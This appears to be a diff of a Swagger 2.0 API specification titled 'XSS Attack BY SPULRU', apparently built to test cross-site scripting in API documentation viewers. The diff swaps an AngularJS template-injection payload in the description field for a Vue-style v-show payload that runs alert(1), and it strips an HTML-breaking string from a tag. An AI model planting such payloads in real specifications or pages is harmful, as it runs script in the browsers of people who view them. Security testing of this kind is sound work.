@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: </p>{{constructor.constructor('alert(1)')()}}<p>
+  description: </p><p v-show="_c.constructor`alert(1)`()"><p>
     
   version: production
 basePath: /JSSResource/
@@ -20,7 +20,7 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - </span>SPULRU_XSS_D<span>
+        - SPULRU_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
